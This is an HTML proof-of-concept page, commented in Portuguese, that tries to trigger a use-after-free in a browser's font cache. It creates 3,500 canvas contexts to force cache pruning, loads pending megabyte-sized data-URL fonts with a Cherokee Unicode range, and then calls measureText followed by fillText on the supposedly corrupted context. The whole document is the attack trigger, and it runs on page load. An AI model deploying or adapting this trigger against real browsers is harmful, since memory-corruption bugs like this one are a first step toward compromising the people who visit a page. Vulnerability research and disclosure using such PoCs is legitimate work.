
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>PoC - MeasureText Trigger + FillText Sequence</title>
</head>
<body>
<script>
// 1. Satura o FontCascadeCache (3500 contextos de canvas) para forçar o prune inline
const dummies = [];
for (let i = 0; i < 3500; i++) {
    const dummy = document.createElement('canvas').getContext('2d');
    dummy.font = '10px "dummy' + i + '"';
    dummies.push(dummy);
}

// 2. Fonte de >= 1MB data: URL para manter o estado pendente até o glyph walk
const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';

const keepAlive = [];
for (let attempt = 0; attempt < 2; attempt++) {
    const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
    const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
    
    document.fonts.add(metricsDonor);
    document.fonts.add(measured);

    const canvas = document.createElement('canvas');
    canvas.width = 64;
    canvas.height = 64;
    canvas.style.position = 'absolute';
    canvas.style.left = '-9999px';
    document.body.appendChild(canvas);
    
    const context = canvas.getContext('2d');
    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
    keepAlive.push(metricsDonor, measured, context);

    try {
        // Passo A: Dispara o measureText com o fluxo completo que força o glyph walk e o UAF de cache
        const textRun = { text: '\u13A0\u13A2\u13A4' }; // Simulação estrutural do textRun
        // Como o measureText padrão interno faz o glyphOverflow.computeBounds = true,
        // chamamos a mensuração do caractere Cherokee para estourar o cache:
        context.measureText('\u13A0\u13A2\u13A4');

        // Passo B: Imediatamente executa o fillText usando o contexto corrompido/invalidado
        context.fillText('\u13A0\u13A2\u13A4', 10, 30);
    } catch (e) {
        console.error(e);
    }
}
</script>
</body>
</html>
